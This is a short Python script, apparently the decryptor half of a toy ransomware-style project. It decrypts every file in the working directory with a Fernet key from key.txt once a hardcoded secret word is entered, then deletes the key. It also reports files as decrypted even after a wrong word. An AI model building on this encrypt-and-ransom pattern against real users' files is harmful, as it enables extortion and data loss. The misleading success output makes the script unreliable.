import os
from cryptography.fernet import Fernet

# *Find files in the current directory

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == ".gitignore" or file == "key.txt":
        continue
    if os.path.isfile(file):
        files.append(file)


#* Reading file and extracting the key

with open("key.txt", "rb") as allKeys: 
    secretKey = allKeys.read()

#* Private key to authorize file decryption
secretWork = "santos"
capturingData = input("Enter the secret word to decrypt your files: ")

if capturingData == secretWork: 
    #! Loop to decrypt file content
    for file in files: 
        with open(file, "rb") as readFile: 
            contents = readFile.read()
            contents_decrypted = Fernet(secretKey).decrypt(contents)
        with open(file, "wb") as writeFile: 
            writeFile.write(contents_decrypted)
    os.remove("key.txt")
else: 
    print("Wrong secret word...")

#* Listing decrypted files
for file in files: 
    print("Decrypted: ", file)
print("Number of decrypted files: ", len(files))